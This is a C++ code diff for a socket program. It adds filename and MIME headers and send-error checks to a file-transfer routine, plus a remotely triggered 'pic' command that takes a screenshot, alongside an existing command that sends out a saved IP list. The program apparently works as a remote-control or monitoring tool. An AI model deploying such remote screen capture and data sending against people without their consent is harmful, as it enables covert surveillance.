@@ -349,16 +349,44 @@ void sendFile(SOCKET clientSocket, const std::string& filename) {
     std::streamsize fileSize = inFile.tellg();
     inFile.seekg(0, std::ios::beg);
 
+    // Extract filename and determine MIME type
+    size_t lastSlash = filename.find_last_of("/\\");
+    std::string fileName = (lastSlash != std::string::npos) ? filename.substr(lastSlash + 1) : filename;
+    std::string mimeType;
+    if (fileName.size() >= 4 && fileName.compare(fileName.size() - 4, 4, ".png") == 0) {
+        mimeType = "image/png";
+    }
+    else if (fileName.size() >= 4 && fileName.compare(fileName.size() - 4, 4, ".mp4") == 0) {
+        mimeType = "video/mp4";
+    }
+    else {
+        std::cerr << "Unsupported file format: " << filename << std::endl;
+        std::string errorMessage = "TYPE:text|SIZE:0\nUnsupported file format.";
+        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        inFile.close();
+        return;
+    }
+
     // Send header
-    std::string header = "TYPE:file|SIZE:" + std::to_string(fileSize) + "\n";
-    send(clientSocket, header.c_str(), header.size(), 0);
+    std::string header = "TYPE:file|SIZE:" + std::to_string(fileSize) + "|FILENAME:" + fileName + "|MIMETYPE:" + mimeType + "\n";
+    if (send(clientSocket, header.c_str(), header.size(), 0) != static_cast<int>(header.size())) {
+        std::cerr << "Failed to send header" << std::endl;
+        inFile.close();
+        return;
+    }
 
     // Send file data
     char buffer[1024];
-    while (!inFile.eof()) {
+    while (inFile) {
         inFile.read(buffer, sizeof(buffer));
         int bytesRead = inFile.gcount();
-        send(clientSocket, buffer, bytesRead, 0);
+        if (bytesRead > 0) {
+            if (send(clientSocket, buffer, bytesRead, 0) != bytesRead) {
+                std::cerr << "Failed to send file data" << std::endl;
+                inFile.close();
+                return;
+            }
+        }
     }
 
     std::cout << "File sent successfully!" << std::endl;
@@ -523,6 +551,9 @@ int main() {
         else if (std::string(buf, 0, bytesReceived) == "send") {
             saveIPListToFile("ip.txt");
             sendFile(clientSocket, "ip.txt");
+        }
+        else if (std::string(buf, 0, bytesReceived) == "pic") {
+            takeScreenshotWithTimestamp();
         }
     }
 
